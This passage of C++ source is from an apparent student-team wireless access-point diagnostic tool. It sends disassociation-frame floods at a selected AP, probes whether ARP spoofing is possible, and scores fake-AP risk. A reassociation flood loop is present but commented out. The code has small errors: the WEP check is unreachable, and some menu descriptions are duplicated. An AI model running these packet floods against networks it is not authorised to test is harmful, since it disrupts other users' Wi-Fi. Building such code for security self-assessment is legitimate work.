   p_icmp_hdr.seq_num=0x7878;


   p_icmp_hdr.checksum=in_cksum((uint16_t *)&p_icmp_hdr, sizeof(struct icmp_hdr));
   p_ip_hdr.total_len=htons(sizeof(p_ip_hdr)+sizeof(p_icmp_hdr));
   p_ip_hdr.hdr_checksum=in_cksum((uint16_t *)&p_ip_hdr, sizeof(ipv4_hdr));


   u_char* ping_req_packet;
   int ping_packet_size = sizeof(struct libnet_ethernet_hdr)+sizeof(struct ipv4_hdr)+sizeof(icmp_hdr);

   ping_req_packet = (uint8_t *)malloc(sizeof(uint8_t) * ping_packet_size);
   memcpy(ping_req_packet, &p_ehdr, sizeof(struct libnet_ethernet_hdr));
   memcpy(ping_req_packet + sizeof(struct libnet_ethernet_hdr), &p_ip_hdr, sizeof(struct ipv4_hdr));
   memcpy(ping_req_packet + sizeof(struct libnet_ethernet_hdr)+sizeof(struct ipv4_hdr), &p_icmp_hdr, sizeof(struct icmp_hdr));

   if (pcap_sendpacket(handle, ping_req_packet, ping_packet_size) != 0) {printf("\nsend packet Error \n");}

   struct libnet_ethernet_hdr *eth_ping_rep;
   struct ipv4_hdr* ipv4_ping_rep;
   struct icmp_hdr* icmp_ping_rep;
   bool arp_defense=false;
   time_t start;

   start=time(NULL);
   while(true) {

           struct pcap_pkthdr* header;
           const u_char* pack;
           int res = pcap_next_ex(handle, &header, &pack);
           if (res == 0) continue;
           if (res == -1 || res == -2) break;
           if(time(NULL)-start>5) {arp_defense=true;break;}


           eth_ping_rep = (struct libnet_ethernet_hdr *)pack;
           if(ntohs(eth_ping_rep->ether_type)!=IPv4) continue;
           int check=0;
           for(int i=0;i<6;i++){
               if(eth_ping_rep->ether_shost[i]!=sel_st_mac[i]){break;}
               check++;
           }
           printf("\n");
           if(check!=6) continue;


           ipv4_ping_rep = (struct ipv4_hdr *)(pack + sizeof(struct libnet_ethernet_hdr));
           if(ipv4_ping_rep->proto_type!=1) continue;
           check=0;
           for(int i=0;i<4;i++){
               if(ipv4_ping_rep->ip_src[i]!=sel_st_ip[i]){break;}
               check++;
           }
           if(check!=4) continue;;
           check=0;
           for(int i=0;i<4;i++){
               if(ipv4_ping_rep->ip_dst[i]!=sel_ip[i]){break;}
               check++;
           }
           if(check!=4) continue;


           icmp_ping_rep = (struct icmp_hdr *)(pack + sizeof(struct libnet_ethernet_hdr)+sizeof(struct ipv4_hdr));
           if((ntohs(icmp_ping_rep->code)!=0)||(ntohs(icmp_ping_rep->type)!=0)) continue;
           printf("Ping Reply Packet received\n");



           check=0;
           for(int i=0;i<6;i++){
               if(eth_ping_rep->ether_dhost[i]!=local_mac[i]){break;}
               check++;
           }
           if(check!=6) arp_defense=true;
           break;
   }
   string a;
   if(arp_defense) a ="defensive";
   else a="not defensive";

   system("clear");
   printf("                               ");
   printf("------------------Result------------------\n");
   printf("                                       ");
   printf("ARP defense : %s\n",a.c_str());




}

void get_local_mac(struct ifreq *v){
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(v->ifr_name, "eth0");

    if (0 != ioctl(fd, SIOCGIFHWADDR, v)) {
        printf("get local mac error \n");
        return ;
    }
    close(fd);//v->ifr_addr.sa_data

    printf("MY MAC : ");
    for(int i=0;i<6;i++)
        printf("%02x ",(unsigned char)v->ifr_addr.sa_data[i]);
    printf("\n");
}

void get_local_ip(u_char *l){
    struct ifreq ifr;

    int fc = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ -1);

    ioctl(fc, SIOCGIFADDR, &ifr);
    close(fc);


    //((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr
    printf("MY IP : %s\n",inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    char* local_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

    sscanf(local_ip, "%hhd.%hhd.%hhd.%hhd", l,l+1,l+2,l+3);

}

void exe_fake(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap, map<vector<uint8_t>,struct ap> ap_ls){
    int risk = 0;
        // duplicate test
        int temp = -1;
        // BSSID
        string str1(sel_ap.essid.begin(), sel_ap.essid.end());

        //list
        vector<string> list;
        list.push_back("KT_GiGA");
        list.push_back("KT_WLAN");
        list.push_back("U+Net");
        list.push_back("iptime");
        list.push_back("SK_WiFi");
        list.push_back("Galaxy");
        list.push_back("TP-Link");
        list.push_back("Series");
        list.push_back("telecop");
        list.push_back("Free");
        list.push_back("free");
        list.push_back("Xiaomi");



        // risk test 1 : no password
        if(sel_ap.cipher==0)  // no password
            risk += 10;
        else if(sel_ap.cipher==0) // wep
            risk += 2;


        // risk test 2 : suspicious name
        for(int i=0; i<list.size(); i++){
            int test = str1.find(list[i]);
            if(test>=0 && test<100){
                risk += 2;
                temp = i;
                break;
            }
        }

        // risk test 3 : duplicate nearby names
        if(temp!=-1){
            cout << "Risk Name : " << list[temp] << endl;
            cout << "-------List of Duplicate Names -------" << endl;

            int cnt = 0;
            for(auto j=ap_ls.begin(); j!=ap_ls.end(); j++){
                string testStr(j->second.essid.begin(), j->second.essid.end());
                int test = testStr.find(list[temp]);
                if(test>=0 && test<100){ // text finding
                    cnt++;
                    cout << testStr << endl;
                }
            }
            cout << "--------------------------------------" << endl;

        if(cnt>=5)
            risk += 3;
        else if(cnt>=3)
            risk += 2;
        else if(cnt>=2)
            risk += 1;
        }


        // risk print
        cout << "Risk Level testing..." << endl;
        usleep(1000000);

        cout << "Fake AP Risk Score : " << risk << endl;
        cout << "Fake AP Risk Rating : ";

        if(risk >= 13)
            cout << "Very High" << endl;
        else if(risk >= 10)
            cout << "High" << endl;
        else if(risk >= 5)
            cout << "Medium" << endl;
        else
            cout << "Low" << endl;

}

void exe_disasso(pcap_t* handle,vector<uint8_t> sel_mac){

    bool attack_defense=false;
    bool scan_run=true;
    uint8_t disasso_size=0;
    uint8_t *disasso=make_disasso(sel_mac,(uint8_t*)&disasso_size);

    //thread_attack --> pcap_sendpacket(handle, packet, packet_size)
    time_t start,end;
    printf("Disassociation testing..(for 30s)\n");
    start=time(NULL);
    thread attack = thread(thread_attack,handle,disasso,disasso_size);
    thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);

    attack.join();
    if((!attack.joinable())&&(scan.joinable())) scan_run=false;
    scan.join();
    end=time(NULL);

    string a;
    if(attack_defense) a ="defensive";
    else a="not defensive";

    system("clear");
    if (a=="defensive"){
        cout << "--------------------------------------" << endl;
        cout << "The AP's PMF function is activated." << endl;
        cout << "--------------------------------------" << endl;
    }
    printf("\n\n                               ");
    printf("------------------Result------------------\n");
    printf("                                         ");
    printf("Total time : %f\n",(double)end-start);
    printf("                                     ");
    printf("Disasso defense : %s\n",a.c_str());
    printf("                               ");
    printf("------------------------------------------\n");


}
/*
void exe_reasso(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
    uint8_t reasso_size;

    //uint8_t *reasso1=make_reasso(sel_mac,sel_ap,(uint8_t*)&reasso_size,1);
    //uint8_t *reasso2=make_reasso(sel_mac,sel_ap,(uint8_t*)&reasso_size,2);
    //uint8_t *reasso3=make_reasso(sel_mac,sel_ap,(uint8_t*)&reasso_size,3);
    uint8_t *reasso1=make_reasso2(sel_mac,sel_ap,(uint8_t*)&reasso_size);
    uint8_t *reasso2=make_reasso2(sel_mac,sel_ap,(uint8_t*)&reasso_size);
    uint8_t *reasso3=make_reasso2(sel_mac,sel_ap,(uint8_t*)&reasso_size);
    printf("~reasso Flooding~\n");

    for(int i=0;i<1000000;i++){
     if (pcap_sendpacket(handle, reasso1, reasso_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, reasso2, reasso_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, reasso3, reasso_size) != 0) printf("\nsend packet Error \n");

    }
}
*/
uint16_t in_cksum(uint16_t *addr, unsigned int len)
{
  uint16_t answer = 0;

  uint32_t sum = 0;
  while (len > 1)  {
    sum += *addr++;
    len -= 2;
  }

  if (len == 1) {
    *(unsigned char *)&answer = *(unsigned char *)addr ;
    sum += answer;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  //answer=sum^0xffff;
  answer = (~sum&0xffff);
  return answer;
}

void help_intro(){
    static const char intro[]=
            "\n\n\n\n\n\n"
            "Wireless AP diagnostic tool - Version 1.0 (2020)\n"
            "Team - 234567.\n\n"
            "usage : bobNET <interface>\n\n\n"
            "First, select ap to diagnose and proceed.\n"
            "Second, select the attack menu to be diagnosed.\n\n"
            "Options - Number selection \n"
            "\t[0] Help(Usage introduction)\t : Describes the attack menu to be diagnosed.\n"
            "\t[1] Rescan\t\t\t : rescan and reselect ap\n"
            "\t[2] Fake AP\t\t\t : The probability that the selected ap is a fake ap is judged as a risk rating.\n"
            "\t\t\t\t\t   * Whether to judge - password, ESSID name, ESSID duplicate\n"
            "\t[3] ARP Pollution : Among the stations connected to the selected ap, Find a station where arp spoofing can proceed.\n"
            "\t\t\t\t\t   * ARP Spoofing - arp spoofing is a man-in-the-middle attack technique that uses\n"
            "\t\t\t\t\t     messages to intercept data packets from other parties.\n"
            "\t[4] Beacon Flooding\t\t : A beacon packet is transmitted by generating a random MAC address including\n"
            "\t\t\t\t\t   the same SSID and channel number as the selected AP. It is possible to determine\n"
            "\t\t\t\t\t   whether the selected AP can be attacked by Beacon Flooding.\n"
            "\t[5] Deauth Attack & Checking\t : Diagnose by checking if deauth attack is possible against the selected AP.\n"
            "\t[6] Disasso Attack & Checking\t : Diagnose by checking if deauth attack is possible against the selected AP.\n"
            "\t[7] Resasso Attack & Checking\t : Diagnose by checking if deauth attack is possible against the selected AP.\n"
            "\t[8] Exit\t\t\t : Exit the diagnostic program\n"
            "\n\n\n\n\n\n";
    cout << intro << endl;
}


